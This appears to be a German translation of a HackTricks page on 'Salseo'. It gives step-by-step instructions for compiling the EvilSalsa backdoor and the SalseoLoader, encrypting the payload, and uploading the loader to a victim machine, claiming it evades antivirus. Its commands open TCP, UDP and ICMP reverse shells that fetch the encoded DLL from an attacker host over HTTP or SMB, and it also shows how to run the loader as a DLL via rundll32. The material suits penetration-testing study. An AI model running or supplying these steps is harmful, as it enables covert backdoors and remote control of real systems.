# Salseo

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Kompilieren der Binärdateien

Laden Sie den Quellcode von GitHub herunter und kompilieren Sie **EvilSalsa** und **SalseoLoader**. Sie benötigen **Visual Studio**, um den Code zu kompilieren.

Kompilieren Sie diese Projekte für die Architektur des Windows-Systems, auf dem Sie sie verwenden werden (Wenn Windows x64 unterstützt, kompilieren Sie sie für diese Architekturen).

Sie können die **Architektur auswählen** innerhalb von Visual Studio im **linken "Build" Tab** unter **"Platform Target".**

(\*\*Wenn Sie diese Optionen nicht finden können, klicken Sie auf **"Project Tab"** und dann auf **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Bauen Sie dann beide Projekte (Build -> Build Solution) (Im Log wird der Pfad der ausführbaren Datei angezeigt):

![](<../.gitbook/assets/image (381).png>)

## Bereiten Sie die Backdoor vor

Zunächst müssen Sie die **EvilSalsa.dll** verschlüsseln. Dazu können Sie das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, jetzt hast du alles, was du brauchst, um das gesamte Salseo-Ding auszuführen: die **codierte EvilDalsa.dll** und das **Binärfile des SalseoLoader.**

**Lade das SalseoLoader.exe-Binärfile auf die Maschine hoch. Es sollte von keinem AV erkannt werden...**

## **Führe das Backdoor aus**

### **Erhalten einer TCP-Reverse-Shell (Herunterladen der codierten dll über HTTP)**

Denke daran, einen nc als Reverse-Shell-Listener zu starten und einen HTTP-Server zu starten, um das codierte evilsalsa bereitzustellen.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Erhalten einer UDP-Reverse-Shell (Herunterladen einer codierten DLL über SMB)**

Denken Sie daran, einen nc als Reverse-Shell-Listener zu starten und einen SMB-Server bereitzustellen, um das codierte evilsalsa zu bedienen (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Erhalt eines ICMP-Reverse-Shells (codierte DLL bereits im Opfer)**

**Dieses Mal benötigen Sie ein spezielles Tool im Client, um den Reverse-Shell zu empfangen. Downloaden Sie:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktivieren von ICMP-Antworten:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Führen Sie den Client aus:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Innerhalb des Opfers führen wir das Salseo-Ding aus:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilieren von SalseoLoader als DLL und Exportieren der Hauptfunktion

Öffnen Sie das SalseoLoader-Projekt mit Visual Studio.

### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Installieren Sie DllExport für dieses Projekt

#### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für Lösung verwalten...**

![](<../.gitbook/assets/image (881).png>)

#### **Suchen Sie nach dem DllExport-Paket (über die Registerkarte Durchsuchen) und klicken Sie auf Installieren (und akzeptieren Sie das Popup)**

![](<../.gitbook/assets/image (100).png>)

In Ihrem Projektordner sind die Dateien **DllExport.bat** und **DllExport\_Configure.bat** erschienen

### **D**einstallieren Sie DllExport

Klicken Sie auf **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)

![](<../.gitbook/assets/image (97).png>)

### **Visual Studio beenden und DllExport\_Configure ausführen**

Einfach Visual Studio **beenden**

Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und führen Sie **DllExport\_Configure.bat** aus

Wählen Sie **x64** (wenn Sie es in einer x64-Box verwenden möchten, das war mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb von **Namespace für DllExport**) und klicken Sie auf **Anwenden**

![](<../.gitbook/assets/image (882).png>)

### **Öffnen Sie das Projekt erneut mit Visual Studio**

**\[DllExport]** sollte nicht mehr als Fehler markiert sein

![](<../.gitbook/assets/image (670).png>)

### Lösung erstellen

Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> SalseoLoader-Eigenschaften --> Anwendung --> Ausgabetyp = Klassenbibliothek)

![](<../.gitbook/assets/image (847).png>)

Wählen Sie die **x64-Plattform** (Projekt --> SalseoLoader-Eigenschaften --> Erstellen --> Zielplattform = x64)

![](<../.gitbook/assets/image (285).png>)

Um die Lösung zu **erstellen**: Build --> Lösung erstellen (Im Ausgabekonsole wird der Pfad der neuen DLL angezeigt)

### Testen Sie die generierte Dll

Kopieren Sie die Dll und fügen Sie sie ein, wo Sie sie testen möchten.

Ausführen:
```
rundll32.exe SalseoLoader.dll,main
```
Wenn kein Fehler angezeigt wird, haben Sie wahrscheinlich eine funktionierende DLL!!

## Erhalten Sie eine Shell unter Verwendung der DLL

Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### Befehlszeile
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
